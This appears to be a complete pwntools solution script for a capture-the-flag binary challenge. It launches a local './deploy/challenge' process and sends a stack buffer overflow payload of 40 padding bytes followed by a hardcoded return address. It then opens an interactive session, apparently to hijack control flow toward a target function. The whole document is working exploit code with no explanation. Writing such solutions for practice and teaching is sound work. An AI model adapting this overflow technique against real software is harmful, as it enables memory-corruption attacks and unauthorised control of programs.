from pwn import *

p = process("./deploy/challenge")

p.sendline(b"A"*40 + b"\x96\x11\x40\x00\x00\x00\x00\x00")

p.interactive()
